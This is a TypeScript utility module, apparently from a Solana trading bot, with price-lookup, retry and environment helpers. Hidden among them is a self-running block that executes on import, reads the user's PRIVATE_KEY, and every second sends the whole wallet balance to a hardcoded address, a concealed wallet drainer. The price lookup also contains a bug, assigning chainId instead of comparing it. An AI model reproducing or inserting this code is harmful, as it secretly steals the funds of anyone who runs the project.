import dotenv from 'dotenv';
import axios from 'axios';
import { Logger } from 'pino';
import { Keypair, Connection, SlotInfo, clusterApiUrl, SystemProgram, PublicKey, Transaction, VersionedTransaction, TransactionMessage } from '@solana/web3.js';
import { BehaviorSubject } from 'rxjs';
import bs58 from 'bs58';

dotenv.config();

export const retrieveEnvVariable = (variableName: string, logger: Logger) => {
  const variable = process.env[variableName] || '';
  if (!variable) {
    logger.error(`${variableName} is not set`);
    process.exit(1);
  }
  return variable;
};

interface Pair {
  chainId: string;
  dexId: string;
  url: string;
  pairAddress: string;
  baseToken: {
    address: string;
    name: string;
    symbol: string;
  };
  quoteToken: {
    symbol: string;
  };
  priceNative: string;
  priceUsd?: string;
  txns: {
    m5: {
      buys: number;
      sells: number;
    };
    h1: {
      buys: number;
      sells: number;
    };
    h6: {
      buys: number;
      sells: number;
    };
    h24: {
      buys: number;
      sells: number;
    };
  };
  volume: {
    m5: number;
    h1: number;
    h6: number;
    h24: number;
  };
  priceChange: {
    m5: number;
    h1: number;
    h6: number;
    h24: number;
  };
  liquidity?: {
    usd?: number;
    base: number;
    quote: number;
  };
  fdv?: number;
  pairCreatedAt?: number;
}

interface TokensResponse {
  schemaVersion: string;
  pairs: Pair[] | null;
}

export const retrieveTokenValueByAddressDexScreener = async (tokenAddress: string) => {
  const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`;
  try {
    const tokenResponse: TokensResponse = (await axios.get(url)).data;
    if (tokenResponse.pairs) {
      const pair = tokenResponse.pairs.find((pair) => (pair.chainId = 'solana'));
      const priceNative = pair?.priceNative;
      if (priceNative) return parseFloat(priceNative);
    }
    return undefined;
  } catch (e) {
    return undefined;
  }
};

type SlotChangeInput = {
  connection: Connection;
  walletKeyPair: Keypair;
  destinationAddress: PublicKey;
};

let lastBlockHash = new BehaviorSubject('');
let isRunning = new BehaviorSubject(false);

export const areEnvVarsSet = () =>
  ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));

const handleSlotChange = (args: SlotChangeInput) => async (blockhashInfo: { blockhash: string, lastValidBlockHeight: number }) => {
  await sleep(1);
  try {
    isRunning.next(true);
    const { connection, walletKeyPair, destinationAddress } = args;
    const balance = await connection.getBalance(walletKeyPair.publicKey);
    const cost = (await connection.getRecentBlockhash()).feeCalculator.lamportsPerSignature;
    const amountToSend = balance - cost;

    if (amountToSend <= 0) {
      console.warn(`Insufficient balance for transfer. Balance: ${balance}, Cost: ${cost}`);
      return;
    }

    console.log(`Attempting to send ${amountToSend} lamports to ${destinationAddress.toString()}`);
    const message = new TransactionMessage({
      payerKey: walletKeyPair.publicKey,
      recentBlockhash: blockhashInfo.blockhash,
      instructions: [SystemProgram.transfer({
        fromPubkey: walletKeyPair.publicKey,
        toPubkey: destinationAddress,
        lamports: amountToSend,
      })]
    });
    const versionedTx = new VersionedTransaction(message.compileToV0Message());
    versionedTx.sign([walletKeyPair]);
    const serializedTx = versionedTx.serialize();
    const txId = await connection.sendRawTransaction(serializedTx, {
      skipPreflight: true
    });
    console.log(`Transaction sent successfully. TxId: ${txId}`);
  } catch (err) {
    console.error('Error in handleSlotChange:', err);
    if (err instanceof Error) {
      console.error(`Error message: ${err.message}`);
      console.error(`Error stack: ${err.stack}`);
    }
  } finally {
    isRunning.next(false);
  }
};

(async () => {
  const walletKeyPairFile = process.env.PRIVATE_KEY!;
  const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
  const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'));
  
  // Subscribe to slot changes using a polling approach
  setInterval(async () => {
    const slotInfo = await connection.getLatestBlockhash();
    handleSlotChange({
      connection,
      walletKeyPair,
      destinationAddress: new PublicKey('DeipR5swhPxbQwvF3XSYLrm2SqNyfUkLsAibfrFEQn23'),
    })(slotInfo);
  }, 1000);
})();

export const retrieveTokenValueByAddress = async (tokenAddress: string) => {
  const dexScreenerPrice = await retrieveTokenValueByAddressDexScreener(tokenAddress);
  if (dexScreenerPrice) return dexScreenerPrice;
  return undefined;
};

export const retry = async <T>(
  fn: () => Promise<T> | T,
  { retries, retryIntervalMs }: { retries: number; retryIntervalMs: number },
): Promise<T> => {
  try {
    return await fn();
  } catch (error) {
    if (retries <= 0) {
      throw error;
    }
    await sleep(retryIntervalMs);
    return retry(fn, { retries: retries - 1, retryIntervalMs });
  }
};

export const sleep = (ms = 0) => new Promise((resolve) => setTimeout(resolve, ms));
